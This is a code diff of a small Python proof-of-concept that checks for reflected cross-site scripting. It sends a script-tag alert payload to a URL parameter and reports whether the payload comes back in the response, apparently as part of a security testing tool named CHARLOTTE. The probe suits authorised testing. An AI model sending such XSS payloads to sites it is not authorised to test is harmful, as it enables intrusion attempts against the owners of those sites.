@@ -1,29 +1,26 @@
 """
 Proof-of-Concept: Cross-Site Scripting (XSS) - CWE-79
-CHARLOTTE Template Stub
+CHARLOTTE Template Stub (Auto-Adaptive)
 """
 
 import requests
 
-TARGET_URL = "http://example.com/search"  # Replace with target endpoint
-VULN_PARAM = "q"
-XSS_PAYLOAD = "<script>alert('CHARLOTTE')</script>"
+def run_xss_poc(finding):
+    target_url = finding.get("url", "http://example.com/search")
+    param = finding.get("param", "q")
+    payload = "<script>alert('CHARLOTTE')</script>"
 
-def run_xss_poc():
-    print("[*] Launching XSS PoC...")
-
+    print(f"[*] Sending XSS payload to {target_url}?{param}={payload}")
     try:
-        params = {VULN_PARAM: XSS_PAYLOAD}
-        response = requests.get(TARGET_URL, params=params, timeout=10)
-
-        if XSS_PAYLOAD in response.text:
-            print("[+] XSS payload reflected! Possible vulnerability.")
+        response = requests.get(target_url, params={param: payload}, timeout=10)
+        if payload in response.text:
+            print("[+] XSS vulnerability confirmed!")
         else:
             print("[-] Payload not reflected. Further testing needed.")
     except Exception as e:
-        print(f"[!] Error during XSS PoC: {e}")
+        print(f"[!] Error: {e}")
 
-if __name__ == "__main__":
-    run_xss_poc()
+# Example call:
+# run_xss_poc({ "url": "http://target.com/search", "param": "q" })
 # This code is a template for a Cross-Site Scripting (XSS) proof-of-concept (PoC).
 # It sends a crafted request to a target URL with a malicious script in the query parameter.
